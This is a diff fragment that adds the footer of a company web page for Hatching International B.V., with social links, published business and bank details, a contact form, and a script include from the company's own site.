+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
